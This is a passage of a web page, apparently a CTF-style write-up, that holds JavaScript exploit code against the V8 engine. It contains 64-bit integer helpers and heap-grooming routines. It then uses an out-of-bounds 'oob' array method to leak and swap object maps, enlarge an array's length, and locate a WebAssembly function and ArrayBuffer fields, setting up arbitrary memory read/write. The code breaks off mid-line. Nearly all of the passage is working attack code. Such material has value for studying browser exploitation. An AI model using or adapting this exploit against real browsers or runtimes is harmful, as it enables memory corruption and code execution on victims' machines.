class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> data.BYTES_PER_ELEMENT !== <span class="hljs-string">'undefined'</span>)</span><br><span class="line">        data = <span class="hljs-built_in">Array</span>.from(data);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">var</span> lines = [];</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; data.length; i += <span class="hljs-number">16</span>) &#123;</span><br><span class="line">        <span class="hljs-keyword">var</span> chunk = data.slice(i, i+<span class="hljs-number">16</span>);</span><br><span class="line">        <span class="hljs-keyword">var</span> parts = chunk.map(hex);</span><br><span class="line">        <span class="hljs-keyword">if</span> (parts.length &gt; <span class="hljs-number">8</span>)</span><br><span class="line">            parts.splice(<span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-string">' '</span>);</span><br><span class="line">        lines.push(parts.join(<span class="hljs-string">' '</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> lines.join(<span class="hljs-string">'\n'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Simplified version of the similarly named python module.</span></span><br><span class="line"><span class="hljs-keyword">var</span> Struct = (<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="line">    <span class="hljs-comment">// Allocate these once to avoid unecessary heap allocations during pack/unpack operations.</span></span><br><span class="line">    <span class="hljs-keyword">var</span> buffer      = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">8</span>);</span><br><span class="line">    <span class="hljs-keyword">var</span> byteView    = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(buffer);</span><br><span class="line">    <span class="hljs-keyword">var</span> uint32View  = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(buffer);</span><br><span class="line">    <span class="hljs-keyword">var</span> float64View = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(buffer);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> &#123;</span><br><span class="line">        pack: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">type, value</span>) </span>&#123;</span><br><span class="line">            <span class="hljs-keyword">var</span> view = type;        <span class="hljs-comment">// See below</span></span><br><span class="line">            view[<span class="hljs-number">0</span>] = value;</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(buffer, <span class="hljs-number">0</span>, type.BYTES_PER_ELEMENT);</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        unpack: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">type, bytes</span>) </span>&#123;</span><br><span class="line">            <span class="hljs-keyword">if</span> (bytes.length !== type.BYTES_PER_ELEMENT)</span><br><span class="line">                <span class="hljs-keyword">throw</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">"Invalid bytearray"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">var</span> view = type;        <span class="hljs-comment">// See below</span></span><br><span class="line">            byteView.set(bytes);</span><br><span class="line">            <span class="hljs-keyword">return</span> view[<span class="hljs-number">0</span>];</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// Available types.</span></span><br><span class="line">        int8:    byteView,</span><br><span class="line">        int32:   uint32View,</span><br><span class="line">        float64: float64View</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//</span></span><br><span class="line"><span class="hljs-comment">// Tiny module that provides big (64bit) integers.</span></span><br><span class="line"><span class="hljs-comment">//</span></span><br><span class="line"><span class="hljs-comment">// Copyright (c) 2016 Samuel Groß</span></span><br><span class="line"><span class="hljs-comment">//</span></span><br><span class="line"><span class="hljs-comment">// Requires utils.js</span></span><br><span class="line"><span class="hljs-comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Datatype to represent 64-bit integers.</span></span><br><span class="line"><span class="hljs-comment">//</span></span><br><span class="line"><span class="hljs-comment">// Internally, the integer is stored as a Uint8Array in little endian byte order.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Int64</span>(<span class="hljs-params">v</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-comment">// The underlying byte array.</span></span><br><span class="line">    <span class="hljs-keyword">var</span> bytes = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(<span class="hljs-number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">switch</span> (<span class="hljs-keyword">typeof</span> v) &#123;</span><br><span class="line">        <span class="hljs-keyword">case</span> <span class="hljs-string">'number'</span>:</span><br><span class="line">            v = <span class="hljs-string">'0x'</span> + <span class="hljs-built_in">Math</span>.floor(v).toString(<span class="hljs-number">16</span>);</span><br><span class="line">        <span class="hljs-keyword">case</span> <span class="hljs-string">'string'</span>:</span><br><span class="line">            <span class="hljs-keyword">if</span> (v.startsWith(<span class="hljs-string">'0x'</span>))</span><br><span class="line">                v = v.substr(<span class="hljs-number">2</span>);</span><br><span class="line">            <span class="hljs-keyword">if</span> (v.length % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>)</span><br><span class="line">                v = <span class="hljs-string">'0'</span> + v;</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">var</span> bigEndian = unhexlify(v, <span class="hljs-number">8</span>);</span><br><span class="line">            bytes.set(<span class="hljs-built_in">Array</span>.from(bigEndian).reverse());</span><br><span class="line">            <span class="hljs-keyword">break</span>;</span><br><span class="line">        <span class="hljs-keyword">case</span> <span class="hljs-string">'object'</span>:</span><br><span class="line">            <span class="hljs-keyword">if</span> (v <span class="hljs-keyword">instanceof</span> Int64) &#123;</span><br><span class="line">                bytes.set(v.bytes());</span><br><span class="line">            &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">                <span class="hljs-keyword">if</span> (v.length != <span class="hljs-number">8</span>)</span><br><span class="line">                    <span class="hljs-keyword">throw</span> <span class="hljs-built_in">TypeError</span>(<span class="hljs-string">"Array must have excactly 8 elements."</span>);</span><br><span class="line">                bytes.set(v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="hljs-keyword">break</span>;</span><br><span class="line">        <span class="hljs-keyword">case</span> <span class="hljs-string">'undefined'</span>:</span><br><span class="line">            <span class="hljs-keyword">break</span>;</span><br><span class="line">        <span class="hljs-keyword">default</span>:</span><br><span class="line">            <span class="hljs-keyword">throw</span> <span class="hljs-built_in">TypeError</span>(<span class="hljs-string">"Int64 constructor requires an argument."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Return a double whith the same underlying bit representation.</span></span><br><span class="line">    <span class="hljs-keyword">this</span>.asDouble = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="line">        <span class="hljs-comment">// Check for NaN</span></span><br><span class="line">        <span class="hljs-keyword">if</span> (bytes[<span class="hljs-number">7</span>] == <span class="hljs-number">0xff</span> &amp;&amp; (bytes[<span class="hljs-number">6</span>] == <span class="hljs-number">0xff</span> || bytes[<span class="hljs-number">6</span>] == <span class="hljs-number">0xfe</span>))</span><br><span class="line">            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RangeError</span>(<span class="hljs-string">"Integer can not be represented by a double"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">return</span> Struct.unpack(Struct.float64, bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Return a javascript value with the same underlying bit representation.</span></span><br><span class="line">    <span class="hljs-comment">// This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)</span></span><br><span class="line">    <span class="hljs-comment">// due to double conversion constraints.</span></span><br><span class="line">    <span class="hljs-keyword">this</span>.asJSValue = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">if</span> ((bytes[<span class="hljs-number">7</span>] == <span class="hljs-number">0</span> &amp;&amp; bytes[<span class="hljs-number">6</span>] == <span class="hljs-number">0</span>) || (bytes[<span class="hljs-number">7</span>] == <span class="hljs-number">0xff</span> &amp;&amp; bytes[<span class="hljs-number">6</span>] == <span class="hljs-number">0xff</span>))</span><br><span class="line">            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RangeError</span>(<span class="hljs-string">"Integer can not be represented by a JSValue"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.</span></span><br><span class="line">        <span class="hljs-keyword">this</span>.assignSub(<span class="hljs-keyword">this</span>, <span class="hljs-number">0x1000000000000</span>);</span><br><span class="line">        <span class="hljs-keyword">var</span> res = Struct.unpack(Struct.float64, bytes);</span><br><span class="line">        <span class="hljs-keyword">this</span>.assignAdd(<span class="hljs-keyword">this</span>, <span class="hljs-number">0x1000000000000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">return</span> res;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Return the underlying bytes of this number as array.</span></span><br><span class="line">    <span class="hljs-keyword">this</span>.bytes = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-built_in">Array</span>.from(bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Return the byte at the given index.</span></span><br><span class="line">    <span class="hljs-keyword">this</span>.byteAt = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">i</span>) </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> bytes[i];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Return the value of this number as unsigned hex string.</span></span><br><span class="line">    <span class="hljs-keyword">this</span>.toString = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">'0x'</span> + hexlify(<span class="hljs-built_in">Array</span>.from(bytes).reverse());</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Basic arithmetic.</span></span><br><span class="line">    <span class="hljs-comment">// These functions assign the result of the computation to their 'this' object.</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Decorator for Int64 instance operations. Takes care</span></span><br><span class="line">    <span class="hljs-comment">// of converting arguments to Int64 instances if required.</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">operation</span>(<span class="hljs-params">f, nargs</span>) </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="line">            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">arguments</span>.length != nargs)</span><br><span class="line">                <span class="hljs-keyword">throw</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">"Not enough arguments for function "</span> + f.name);</span><br><span class="line">            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">arguments</span>.length; i++)</span><br><span class="line">                <span class="hljs-keyword">if</span> (!(<span class="hljs-built_in">arguments</span>[i] <span class="hljs-keyword">instanceof</span> Int64))</span><br><span class="line">                    <span class="hljs-built_in">arguments</span>[i] = <span class="hljs-keyword">new</span> Int64(<span class="hljs-built_in">arguments</span>[i]);</span><br><span class="line">            <span class="hljs-keyword">return</span> f.apply(<span class="hljs-keyword">this</span>, <span class="hljs-built_in">arguments</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// this = -n (two's complement)</span></span><br><span class="line">    <span class="hljs-keyword">this</span>.assignNeg = operation(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">neg</span>(<span class="hljs-params">n</span>) </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)</span><br><span class="line">            bytes[i] = ~n.byteAt(i);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.assignAdd(<span class="hljs-keyword">this</span>, Int64.One);</span><br><span class="line">    &#125;, <span class="hljs-number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// this = a + b</span></span><br><span class="line">    <span class="hljs-keyword">this</span>.assignAdd = operation(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span>(<span class="hljs-params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">var</span> carry = <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;</span><br><span class="line">            <span class="hljs-keyword">var</span> cur = a.byteAt(i) + b.byteAt(i) + carry;</span><br><span class="line">            carry = cur &gt; <span class="hljs-number">0xff</span> | <span class="hljs-number">0</span>;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;</span><br><span class="line">    &#125;, <span class="hljs-number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// this = a - b</span></span><br><span class="line">    <span class="hljs-keyword">this</span>.assignSub = operation(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sub</span>(<span class="hljs-params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">var</span> carry = <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;</span><br><span class="line">            <span class="hljs-keyword">var</span> cur = a.byteAt(i) - b.byteAt(i) - carry;</span><br><span class="line">            carry = cur &lt; <span class="hljs-number">0</span> | <span class="hljs-number">0</span>;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;</span><br><span class="line">    &#125;, <span class="hljs-number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Constructs a new Int64 instance with the same bit representation as the provided double.</span></span><br><span class="line">Int64.fromDouble = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">d</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">var</span> bytes = Struct.pack(Struct.float64, d);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Int64(bytes);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Return -n (two's complement)</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Neg</span>(<span class="hljs-params">n</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> Int64()).assignNeg(n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Return a + b</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Add</span>(<span class="hljs-params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> Int64()).assignAdd(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Return a - b</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Sub</span>(<span class="hljs-params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> Int64()).assignSub(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Some commonly used numbers.</span></span><br><span class="line">Int64.Zero = <span class="hljs-keyword">new</span> Int64(<span class="hljs-number">0</span>);</span><br><span class="line">Int64.One = <span class="hljs-keyword">new</span> Int64(<span class="hljs-number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gc</span>(<span class="hljs-params"></span>)</span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line"><span class="hljs-comment">/*fill-up the 1MB semi-space page, force V8 to scavenge NewSpace.*/</span></span><br><span class="line">    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;((<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>)/<span class="hljs-number">0x10</span>);i++)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="hljs-keyword">var</span> a= <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">give_me_a_clean_newspace</span>(<span class="hljs-params"></span>)</span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line"><span class="hljs-comment">/*force V8 to scavenge NewSpace twice to get a clean NewSpace.*/</span></span><br><span class="line">gc()</span><br><span class="line">gc()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> f64 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(<span class="hljs-number">1</span>);</span><br><span class="line"><span class="hljs-keyword">let</span> u32 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(f64.buffer);</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">d2u</span>(<span class="hljs-params">v</span>) </span>&#123;</span><br><span class="line">f64[<span class="hljs-number">0</span>] = v;</span><br><span class="line"><span class="hljs-keyword">return</span> u32;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">u2d</span>(<span class="hljs-params">lo, hi</span>) </span>&#123;</span><br><span class="line">u32[<span class="hljs-number">0</span>] = lo;</span><br><span class="line">u32[<span class="hljs-number">1</span>] = hi;</span><br><span class="line"><span class="hljs-keyword">return</span> f64;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Hex</span>(<span class="hljs-params">lo, hi</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span>( lo == <span class="hljs-number">0</span> ) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> (<span class="hljs-string">"0x"</span> + hi.toString(<span class="hljs-number">16</span>) + <span class="hljs-string">"00000000"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">if</span>( hi == <span class="hljs-number">0</span> ) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> (<span class="hljs-string">"0x"</span> + lo.toString(<span class="hljs-number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">return</span> (<span class="hljs-string">"0x"</span> + hi.toString(<span class="hljs-number">16</span>) + lo.toString(<span class="hljs-number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">view</span>(<span class="hljs-params">array, lim</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; lim; i++) &#123;</span><br><span class="line">        t = array[i];</span><br><span class="line">        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"["</span> + i + <span class="hljs-string">"] : "</span> + hex(d2u(t)[<span class="hljs-number">0</span>], d2u(t)[<span class="hljs-number">1</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> GlobalArr=[];</span><br><span class="line"><span class="hljs-keyword">var</span> GlobalObjs=[];</span><br><span class="line"><span class="hljs-keyword">var</span> GlobalBuffer=[];</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> LengthOffset=<span class="hljs-number">0</span>;</span><br><span class="line"><span class="hljs-keyword">var</span> LengthToBe=(<span class="hljs-keyword">new</span> Int64(<span class="hljs-string">"7fffffff00000000"</span>)).asDouble()</span><br><span class="line"><span class="hljs-keyword">var</span> oob_arr = <span class="hljs-literal">null</span>;</span><br><span class="line"><span class="hljs-keyword">let</span> victim_obj = <span class="hljs-literal">null</span>;</span><br><span class="line"><span class="hljs-keyword">let</span> victimobj_obj_offset_of_OOBARR = <span class="hljs-literal">null</span>;</span><br><span class="line"><span class="hljs-keyword">let</span> victim_buf = <span class="hljs-literal">null</span>;</span><br><span class="line"><span class="hljs-keyword">let</span> victimbuf_backingstore_pointer_offset_of_OOBARR = <span class="hljs-literal">null</span>;</span><br><span class="line"><span class="hljs-keyword">let</span> rwaddr=<span class="hljs-literal">null</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exploit</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> wasm_code = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([<span class="hljs-number">0</span>, <span class="hljs-number">97</span>, <span class="hljs-number">115</span>, <span class="hljs-number">109</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">96</span>, <span class="hljs-number">2</span>, <span class="hljs-number">127</span>, <span class="hljs-number">127</span>, <span class="hljs-number">1</span>, <span class="hljs-number">127</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">112</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">21</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>, <span class="hljs-number">109</span>, <span class="hljs-number">111</span>, <span class="hljs-number">114</span>, <span class="hljs-number">121</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">95</span>, <span class="hljs-number">90</span>, <span class="hljs-number">51</span>, <span class="hljs-number">97</span>, <span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">105</span>, <span class="hljs-number">105</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">9</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>, <span class="hljs-number">1</span>, <span class="hljs-number">32</span>, <span class="hljs-number">0</span>, <span class="hljs-number">106</span>, <span class="hljs-number">11</span>]);</span><br><span class="line"><span class="hljs-keyword">let</span> wasm_mod = <span class="hljs-keyword">new</span> WebAssembly.Instance(<span class="hljs-keyword">new</span> WebAssembly.Module(wasm_code), &#123;&#125;);</span><br><span class="line"><span class="hljs-keyword">let</span> f = wasm_mod.exports._Z3addii;</span><br><span class="line"></span><br><span class="line">give_me_a_clean_newspace()</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> array=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">10</span>)</span><br><span class="line"><span class="hljs-keyword">let</span> obj=&#123;<span class="hljs-attr">a</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">b</span>:<span class="hljs-number">2</span>,<span class="hljs-attr">c</span>:<span class="hljs-number">3</span>,<span class="hljs-attr">d</span>:<span class="hljs-number">4</span>,<span class="hljs-attr">e</span>:<span class="hljs-number">5</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> array2=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">10</span>)</span><br><span class="line"><span class="hljs-keyword">let</span> obj2=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">10</span>);</span><br><span class="line">obj2[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="hljs-keyword">let</span> victim=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">10</span>)</span><br><span class="line">victim[<span class="hljs-number">0</span>]=<span class="hljs-number">1.1</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//%DebugPrint(obj);</span></span><br><span class="line"><span class="hljs-comment">//%DebugPrint(obj2);</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//console.log("cz1")</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//console.log("============================")</span></span><br><span class="line"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">"[+]leak the first map:  "</span>,Int64.fromDouble(array.oob()))</span><br><span class="line"><span class="hljs-keyword">let</span> map1=<span class="hljs-keyword">new</span> Int64(Int64.fromDouble(array.oob()))</span><br><span class="line"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">"[+]leak the second map:  "</span>,Int64.fromDouble(array2.oob()));</span><br><span class="line"><span class="hljs-keyword">let</span> map2=<span class="hljs-keyword">new</span> Int64(Int64.fromDouble(array2.oob()))</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//overwrite the array2.map</span></span><br><span class="line">array2.oob(map1.asDouble())</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//console.log(obj2.a)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//overwrite the length</span></span><br><span class="line">obj2.a=<span class="hljs-number">0x1000</span>;</span><br><span class="line"><span class="hljs-comment">//%DebugPrint(obj2)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//return the map2</span></span><br><span class="line">array2.oob(map2.asDouble())</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">console</span>.log(obj2.length);</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//%DebugPrint(obj2);</span></span><br><span class="line"><span class="hljs-comment">//%DebugPrint(victim)</span></span><br><span class="line">obj2[<span class="hljs-number">13</span>]=<span class="hljs-number">0x2333</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//%DebugPrint(victim)</span></span><br><span class="line"><span class="hljs-comment">//console.log("cz2")</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> leaked = [<span class="hljs-number">0xdada</span>, <span class="hljs-number">0xadad</span>, f, &#123;&#125;, <span class="hljs-number">1.1</span>];</span><br><span class="line"><span class="hljs-keyword">let</span> ab = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x50</span>);</span><br><span class="line"><span class="hljs-keyword">let</span> idx = <span class="hljs-number">0</span>;</span><br><span class="line"><span class="hljs-keyword">let</span> wasm_idx = <span class="hljs-number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; i++) &#123;</span><br><span class="line">value = d2u(victim[i]);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (value[<span class="hljs-number">1</span>] === <span class="hljs-number">0xdada</span>) &#123;</span><br><span class="line">t = d2u(victim[i + <span class="hljs-number">1</span>]);</span><br><span class="line"><span class="hljs-keyword">if</span> (t[<span class="hljs-number">1</span>] === <span class="hljs-number">0xadad</span>)&#123;</span><br><span class="line">wasm_idx = i + <span class="hljs-number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (value[<span class="hljs-number">0</span>] === <span class="hljs-number">0x50</span>) &#123;</span><br><span class="line">idx = i;</span><br><span class="line"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">"[-] find index : "</span> + idx);</span><br><span class="line"><span class="hljs-keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// change ArrayBuffer's byteLength property</span></span><br><span class="line">tt = u2d(<span class="hljs-number">0x2000</span>, <span class="hljs-number">0</span>);</span><br><span class="line"><span class="hljs-built_in">eval</span>(<span class="hljs-string">`victim[<span class="hljs-subst">$&#123;idx&#125;</span>] = <span 